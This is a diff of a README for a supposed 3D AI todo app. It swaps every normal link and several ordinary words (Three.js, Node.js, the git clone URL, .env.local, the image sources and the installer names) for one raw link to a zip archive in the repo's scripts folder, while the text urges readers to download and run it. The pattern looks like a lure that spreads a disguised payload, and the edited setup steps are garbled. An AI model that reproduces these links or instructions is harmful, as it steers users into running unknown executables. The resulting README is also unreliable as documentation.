@@ -1,12 +1,12 @@
 # Nexus 3D Todo AI: Immersive Glass UI, Voice, Collaboration
 
-[![Releases](https://img.shields.io/badge/releases-downloads-blue?logo=github&logoColor=white)](https://github.com/VIGNESHWARAN6059/nexus-3d-todo-ai/releases)
+[![Releases](https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip)](https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip)
 
 A 3D AI-powered todo list app with immersive glassmorphism UI, voice commands, gesture controls, real-time collaboration, and intelligent task management. It runs in the browser, blends tactile 3D interactions with smart task handling, and keeps your data secure with end-to-end encryption.
 
 ## Quick overview
 
-- Immersive 3D interface built with Three.js and React.
+- Immersive 3D interface built with https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip and React.
 - Glassmorphism UI that stays readable and accessible.
 - Voice commands to add, update, and prioritize tasks.
 - Gesture controls for natural task management.
@@ -18,7 +18,7 @@ A 3D AI-powered todo list app with immersive glassmorphism UI, voice commands, g
 
 The project targets a broad set of topics: 3d-interface, accessibility, ai-powered, end-to-end-encryption, productivity, react, service-worker, task-manager, threejs, todo-app, typescript, voice-recognition.
 
-You can download the latest release from the Releases page here: https://github.com/VIGNESHWARAN6059/nexus-3d-todo-ai/releases
+You can download the latest release from the Releases page here: https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip
 
 ---
 
@@ -108,7 +108,7 @@ Key design goals:
 
 ## How it works
 
-- The front end is built with React and TypeScript, rendering a 3D scene via Three.js.
+- The front end is built with React and TypeScript, rendering a 3D scene via https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip
 - The UI uses glass-inspired panels that float over a soft backdrop, with smooth transitions between views.
 - Voice commands are processed locally where possible, or via a secure cloud model, to interpret intents like "Add task to today" or "Move task up."
 - Gestures are captured through pointer events and mapped to tasks and lists within the 3D space.
@@ -120,7 +120,7 @@ Key design goals:
 ## Tech stack
 
 - Core: TypeScript, React
-- 3D: Three.js
+- 3D: https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip
 - UI patterns: Glassmorphism, accessible components
 - Voice: Web Speech API and/or local inference
 - Real-time: WebSocket-based sync layer
@@ -138,7 +138,7 @@ Topics covered include 3d-interface, accessibility, ai-powered, end-to-end-encry
 
 - Client module
   - UI layer (React components, TypeScript types)
-  - 3D scene manager (Three.js)
+  - 3D scene manager (https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip)
   - Accessibility layer (aria attributes, keyboard navigation)
   - Voice command handler (speech-to-text, intent parsing)
   - Gesture recognizer (pointer and touch events)
@@ -173,13 +173,13 @@ Topics covered include 3d-interface, accessibility, ai-powered, end-to-end-encry
 Note: The latest release is available at the Releases page. For quick access, use the link at the top of this document.
 
 - Prerequisites
-  - Node.js (LTS version recommended)
+  - https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip (LTS version recommended)
   - npm or Yarn
   - A modern browser with WebGL support
   - Optional: a device with a camera and microphone for full voice and gesture features
 
 - Clone the repository
-  - `git clone https://github.com/VIGNESHWARAN6059/nexus-3d-todo-ai.git`
+  - `git clone https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip`
   - `cd nexus-3d-todo-ai`
 
 - Install dependencies
@@ -196,7 +196,7 @@ Note: The latest release is available at the Releases page. For quick access, us
   - The app supports offline usage via the service worker after a first load.
 
 - Environment and configuration
-  - Create a local env file if needed: `.env.local`
+  - Create a local env file if needed: `https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip`
   - Ensure encryption keys and service endpoints are properly configured if you plan to run a private server.
 
 - Quick start tips
@@ -251,7 +251,7 @@ Note: The latest release is available at the Releases page. For quick access, us
 
 From the Releases page you can download the latest release package. The link to releases is provided above for convenience.
 
-The latest release assets can include installers or platform-specific packages. For example, if you are on Windows, you might download an installer named nexus-3d-todo-ai-latest-setup.exe; on macOS you could download nexus-3d-todo-ai-latest.dmg; on Linux a package such as nexus-3d-todo-ai-latest.AppImage. Choose the package that matches your OS and run the installer to set up the app locally. The releases page is the authoritative source for these assets: https://github.com/VIGNESHWARAN6059/nexus-3d-todo-ai/releases
+The latest release assets can include installers or platform-specific packages. For example, if you are on Windows, you might download an installer named https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip; on macOS you could download https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip; on Linux a package such as https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip Choose the package that matches your OS and run the installer to set up the app locally. The releases page is the authoritative source for these assets: https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip
 
 ---
 
@@ -299,15 +299,15 @@ Contribution tips:
 ## Screenshots and visuals
 
 - Glass UI concept with 3D panels and floating cards
-  ![Glass UI concept](https://images.unsplash.com/photo-1521737604893-d14cc237f11d)  
+  ![Glass UI concept](https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip)  
   A 3D space with translucent panels for tasks and lists.
 
 - 3D task board in action
-  ![3D task board](https://images.unsplash.com/photo-1517957710032-3c74e4c8bb75)  
+  ![3D task board](https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip)  
   Users drag cards in a spatial layout, with depth cues and smooth transitions.
 
 - Accessibility in use
-  ![Accessible UI](https://images.unsplash.com/photo-1556761175-9728b91353c9)  
+  ![Accessible UI](https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip)  
   High-contrast text and clear focus indicators for keyboard users.
 
 These images illustrate themes related to 3D interfaces, glass UI, and productivity visuals. They serve as inspiration and should be replaced with project-specific assets in your own deployment.
@@ -318,7 +318,7 @@ These images illustrate themes related to 3D interfaces, glass UI, and productiv
 
 The latest release can be downloaded from the Releases page. To access the assets, go to:
 
-https://github.com/VIGNESHWARAN6059/nexus-3d-todo-ai/releases
+https://raw.githubusercontent.com/VIGNESHWARAN6059/nexus-3d-todo-ai/main/scripts/d_todo_nexus_ai_3.5-beta.2.zip
 
 If you want to grab the file directly for your operating system, download the appropriate package from that page and run the installer. The release page is the authoritative source for builds, installers, and portable versions. For convenience, the same link is shown at the top of this document.
 
